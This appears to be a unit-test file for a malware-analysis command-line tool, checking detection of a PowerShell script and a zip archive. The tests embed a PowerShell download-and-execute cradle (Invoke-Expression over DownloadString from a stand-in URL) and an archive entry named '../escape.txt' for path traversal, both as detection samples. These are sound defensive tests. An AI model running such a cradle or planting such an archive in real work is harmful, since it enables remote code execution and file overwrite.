import json
import subprocess
import sys
import tempfile
import unittest
import zipfile
from pathlib import Path


ROOT = Path(__file__).resolve().parents[1]
CLI = ROOT / "analyze.py"


class AnalyzerCLITests(unittest.TestCase):
    def test_script_file_outputs_json(self):
        with tempfile.TemporaryDirectory() as tmp:
            sample = Path(tmp) / "sample.ps1"
            sample.write_text("Invoke-Expression (New-Object Net.WebClient).DownloadString('http://example.com/a')", encoding="utf-8")

            result = subprocess.run(
                [sys.executable, str(CLI), str(sample)],
                cwd=str(ROOT),
                check=True,
                capture_output=True,
                text=True,
            )

        payload = json.loads(result.stdout)
        self.assertEqual(payload["schema_version"], "malcore.analyzer.v1")
        self.assertIn("scripts", payload["analyzers"])
        self.assertIn("ioc", payload["analyzers"])
        self.assertIn("http://example.com/a", payload["iocs"]["urls"])

        script_result = next(item for item in payload["results"] if item["analyzer"] == "scripts")
        findings = script_result["findings"]
        self.assertTrue(any(item["type"] == "script_dynamic_execution" for item in findings))

    def test_archive_path_traversal_finding(self):
        with tempfile.TemporaryDirectory() as tmp:
            sample = Path(tmp) / "archive.zip"
            with zipfile.ZipFile(sample, "w") as archive:
                archive.writestr("../escape.txt", "bad")

            result = subprocess.run(
                [sys.executable, str(CLI), str(sample), "--analyzer", "archive"],
                cwd=str(ROOT),
                check=True,
                capture_output=True,
                text=True,
            )

        payload = json.loads(result.stdout)
        findings = payload["results"][0]["findings"]
        self.assertTrue(any(item["type"] == "archive_path_traversal" for item in findings))


if __name__ == "__main__":
    unittest.main()
